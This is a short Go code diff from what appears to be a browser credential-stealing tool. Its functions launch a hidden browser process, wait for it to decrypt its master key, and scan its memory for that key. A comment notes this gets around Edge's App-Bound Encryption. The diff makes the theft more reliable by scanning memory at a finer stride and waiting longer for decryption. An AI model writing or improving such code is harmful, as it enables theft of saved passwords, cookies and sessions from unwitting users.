@@ -213,7 +213,7 @@ func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
 		}
 		buf = buf[:bytesRead]
 
-		for i := 0; i+32 <= len(buf); i += 16 {
+		for i := 0; i+32 <= len(buf); i += 4 {
 			candidate := buf[i : i+32]
 			if !highEntropy(candidate) {
 				continue
@@ -374,7 +374,9 @@ func spawnHiddenBrowser(exePath string, ciphertext []byte) ([]byte, error) {
 	defer syscall.CloseHandle(pi.Process)
 
 	// Give the browser enough time to load the profile and decrypt the master key.
-	time.Sleep(2500 * time.Millisecond)
+	// 4 s is needed on slower VMs and for Edge v20 (App-Bound key decryption via
+	// elevation_service.exe adds latency on top of normal profile init).
+	time.Sleep(4000 * time.Millisecond)
 
 	return scanPIDForKey(pi.ProcessId, ciphertext)
 }
